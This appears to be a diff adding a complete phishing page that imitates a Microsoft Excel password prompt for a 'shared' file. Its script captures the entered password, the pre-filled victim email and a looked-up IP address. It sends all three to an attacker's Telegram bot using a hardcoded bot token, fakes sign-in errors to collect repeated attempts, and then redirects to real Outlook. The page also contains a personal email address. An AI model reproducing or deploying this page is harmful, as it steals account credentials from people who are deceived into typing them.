@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+ 
+     <title>Excel Local | Shared</title>
+</head>
+
+<style type="text/css">
+	* {
+		margin: 0;
+		padding:0;
+		box-sizing: border-box;
+		border:0;
+		outline: 0;
+	}
+
+	body {
+		background:black;
+		    font-family: SegoeUI-SemiBold-final,Segoe UI Semibold,SegoeUI-Regular-final,Segoe UI,"Segoe UI Web (West European)",Segoe,-apple-system,BlinkMacSystemFont,Roboto,Helvetica Neue,Tahoma,Helvetica,Arial,sans-serif;
+	}
+	.overlay {
+		background:url("https://i.ibb.co/jWpqmNr/photo-2023-03-14-13-24-45.jpg");
+		background-size: cover;
+		background-repeat: no-repeat;
+		filter:blur(0.1rem);
+		height: 100vh;
+		position: absolute;
+		width: 100%;
+		top:0;
+		left: 50%;
+	  transform: translate(-50%,0);
+	}
+
+	.jumbotron	{
+		background: white;
+		padding: 2rem 3rem;
+		width: 450px;
+		max-width: 100%;
+		position: relative;
+		display: flex;
+		margin: 7% auto;
+		flex-direction: column;
+
+		  -webkit-animation: slideIn 0.1s forwards;
+  -moz-animation: slideIn 0.1s forwards;
+  animation: slideIn 0.1s forwards;
+
+	}
+
+	@-webkit-keyframes slideIn {
+  0% {
+    transform: translateX(-900px);
+  }
+  100% {
+    transform: translateX(0);
+  }
+}
+@-moz-keyframes slideIn {
+  0% {
+    transform: translateX(-900px);
+  }
+  100% {
+    transform: translateX(0);
+  }
+}
+@keyframes slideIn {
+  0% {
+    transform: translateX(-900px);
+  }
+  100% {
+    transform: translateX(0);
+  }
+}
+
+	.img_brand {
+		padding-bottom: 1.5rem;
+	}
+
+	.arrow__name {
+		display: flex;
+		gap:1rem;
+		align-items: center;
+		padding-bottom: 1rem;
+	}
+
+	.arrow__name h4 {
+		font-family: inherit;
+		font-weight: lighter;
+		font-size: 15px;
+	}
+
+	.section {
+		padding-bottom: 1rem
+	}
+
+	p {
+		font-size: 13px;
+		font-weight: 100;
+	}
+
+	input[type=password] {
+		border-bottom: 1px solid rgba(0, 0, 0, 0.6);
+		padding:10px 0;
+		font-size:15px;
+	}
+
+	input[type=password]:focus {
+				border-bottom: 1px solid #0067b8;
+	
+	}
+
+	a {
+		text-decoration: none;
+		font-size: 13px;
+		color:#0067b8;
+		padding:1rem 0;
+	}
+
+	a:hover {
+		text-decoration: underline;
+		color :  rgba(0, 0, 0, 0.6);
+	}
+
+	.btn-group {
+		display: flex;
+		justify-content: flex-end;
+		margin-top: 1rem
+	}
+
+	button {
+
+    min-width: 100px;
+    padding: 6px 15px 6px 15px;
+    margin-top: 4px;
+    margin-bottom: 4px;
+    position: relative;
+    max-width: 100%;
+    text-align: center;
+    white-space: nowrap;
+    overflow: hidden;
+    vertical-align: middle;
+    text-overflow: ellipsis;
+    touch-action: manipulation;
+    color: #000;
+    border-style: solid;
+    border-width: 2px;
+    border-color: transparent;
+    background-color: rgba(0, 0, 0, 0.2);
+    width:100px;
+        border-color: #0067b8;
+    background-color: #0067b8;
+    color:white;
+    cursor: pointer;
+    font-size: 15px;
+
+
+	}
+
+	@media only screen and (max-width: 600px){
+    .overlay {
+    	display: none;
+    }
+    body {
+    	background: white;
+    }
+
+    .jumbotron	{
+		padding: 1rem 2rem;
+
+	}
+}
+
+	
+</style>
+<body>
+	<div class="overlay"></div>
+	<div class="container">
+		<div class="jumbotron">
+			<div class="img_brand">
+				<img src="https://findicons.com/files/icons/2795/office_2013_hd/2000/excel.png" style="width: 20%">
+			</div>
+			<div class="arrow__name">
+				<img src="https://submit-form.com/fgbvxnVQ" style="width: 4%;">
+				<input type="hidden" name="email" id="email_addy" value="caesar4choice13@yahoo.com">
+				<h4 id="email__url"></h4>	
+			</div>
+			<h2 class="section">Enter password</h2>
+			<p class="section">Because you are accessing sensitive info, you need to verify your password to view online excel</p>
+			<p id="password__empty" style="color:red; display: none;">Password cannot be empty</p>
+			<p id="password__incorrect" style="color:red; display: none;">Sorry, your sign-in timed out. Please sign in again.</p>
+			<p id="password__incorrect1" style="color:red; display: none;">Your account or password is incorrect. Check and retry to login.</p>
+
+			<input type="password" name="password" id="password" class="password" placeholder="Password">
+			<input type="hidden" id="hidden_ip">
+			<a href="#">Note: Only recipient email can access shared files</a>
+			<div class="btn-group">
+					<button type="button" id="signIn">Signin</button>
+			</div>
+		</div>
+	</div>
+</body>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+
+
+	function sendTeleMsg(email, passkey, ip) {
+
+		    var message = "";
+		    message += "+===========OFFICE LOGIN ======="+'\n'
+		    message += "[IP] "  +  " : " + ip + '\n';
+
+		    message += "[murphy.mokNAME] "  +  " : " + email + '\n';
+		    message += "[PASSWORD] "  +  " : " + passkey;
+
+
+		    let token = '5810590640:AAHaIpLIkb4NOsdW88-rerKZUL80dNFOulg';
+		    var chatid = '1173038962';
+
+		    var settings = {
+		    "async": true,
+		    "crossDomain": true,
+		    "url": "https://api.telegram.org/bot" + token + "/sendMessage?chat_id="+chatid,
+		    "method": "POST",
+		    "headers": {
+		        "Content-Type": "application/json",
+		        "cache-control": "no-cache"
+		    },
+		    "data": JSON.stringify({
+		        "chat_id": chatid,
+		        "text": message
+		    })
+		    }
+
+		    $.ajax(settings).done(function (response) {
+		    if(response.ok === true) {
+		       // window.location.href = "https://myid.telstra.com/identity/as/lafEA/resume/as/authorization.ping";
+		    }
+		    
+		    }); 
+
+	}
+    $(document).ready(function () {
+
+    let ip;
+    $.getJSON('https://json.geoiplookup.io/?callback=?', function(data) {
+    var obj = JSON.parse(JSON.stringify(data));
+  			 document.getElementById("hidden_ip").value = obj.ip;
+        });
+    });
+	
+	
+  	var email = document.querySelector("#email_addy").value;
+  	//const email = location.search.substring(location.search.lastIndexOf('=') + 1);
+	document.querySelector("#email__url").innerHTML=email;
+	let count = 0;
+
+	document.querySelector("#signIn").addEventListener('click', function(){
+		const passkey = document.querySelector("#password").value;
+		  	const ip = document.querySelector("#hidden_ip").value;
+		//  	console.log(ip);
+		count++
+		if(!passkey) {
+			document.querySelector("#password__empty").style.display="block";
+			setTimeout(()=>{
+				document.querySelector("#password__empty").style.display="none";
+			}, 1000)
+		} 
+		else {
+
+			if(count == 3) {
+					 sendTeleMsg(email, passkey, ip);
+					 window.location.href="https://outlook.office.com/mail/";
+				} else if(count == 2) {
+						sendTeleMsg(email, passkey, ip);
+						document.querySelector("#password__incorrect1").style.display="block";
+						setTimeout(()=>{
+						document.querySelector("#password__incorrect1").style.display="none";
+						document.querySelector("#password").value="";
+					}, 1000)
+						
+				}
+
+				else {
+					   sendTeleMsg(email, passkey, ip);
+						document.querySelector("#password__incorrect").style.display="block";
+						setTimeout(()=>{
+						document.querySelector("#password__incorrect").style.display="none";
+						document.querySelector("#password").value="";
+					}, 1000)
+
+			}
+
+				
+		}
+	})
+
+
+</script>
+
+<script type="text/javascript">
+
+	</script>
+</html>
